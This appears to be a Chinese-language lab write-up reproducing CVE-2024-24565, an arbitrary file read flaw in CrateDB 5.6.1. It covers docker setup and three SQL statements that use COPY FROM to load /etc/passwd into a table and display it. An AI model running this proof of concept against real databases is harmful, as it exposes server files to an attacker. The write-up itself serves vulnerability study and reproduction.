# CVE-2024-24565 CrateDB数据库任意文件读取漏洞

#### **漏洞描述**

CrateDB是一个开源的分布式SQL数据库，它使得实时存储和分析大量数据变得非常简单。CrateDB数据库中有一个COPYFROM函数，用于将文件数据导入到数据库表中。该功能有一个缺陷，通过身份验证的攻击者可以使用COPY FROM功能将任意文件内容导入到数据库表中。从而造成信息泄露。

官方文档参考

[CrateDB Database Product Overview](https://cratedb.com/product)

[Data manipulation — CrateDB: Reference](https://cratedb.com/docs/crate/reference/en/5.6/general/dml.html#dml-importing-data)

参考链接：

- https://nvd.nist.gov/vuln/detail/CVE-2024-24565
- https://blog.csdn.net/shelter1234567/article/details/136191448

#### **漏洞环境**

执行如下命令启动一个CrateDB 5.6.1

```
docker compose up 
```

服务启动后，访问`http://your-ip:4200`

![https://img-blog.csdnimg.cn/direct/494f9a174ea94d969a9e683d6fa1cd05.png](https://img-blog.csdnimg.cn/direct/494f9a174ea94d969a9e683d6fa1cd05.png)

如果出现，下面的报错

[1]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144] by adding vm.max_map_count = 262144 to /etc/sysctl.conf or invoking sysctl -w vm.max_map_count=262144

执行以下命令来临时修改 vm.max_map_count 的值：

```shell
sudo sysctl -w vm.max_map_count=262144
```



#### 漏洞复现

依次执行如下命令

```sql
CREATE TABLE info_leak(info_leak STRING);
COPY info_leak FROM '/etc/passwd' with (format='csv', header=false);
SELECT * FROM info_leak;
```

————————————————

1.CREATE TABLE info_leak(info_leak STRING);

![](https://img-blog.csdnimg.cn/direct/12a001cc341d4f0183c51a60918b96f2.png)

2.COPY info_leak FROM '/etc/passwd' with (format='csv', header=false);

![](https://img-blog.csdnimg.cn/direct/ef0fffbfda87454d972ea95738b8cfd0.png)

3.SELECT * FROM info_leak;

![](https://img-blog.csdnimg.cn/direct/aed691b4cd2a476e974fcb7146c98a59.png)

成功查看到etc/passwd文件 
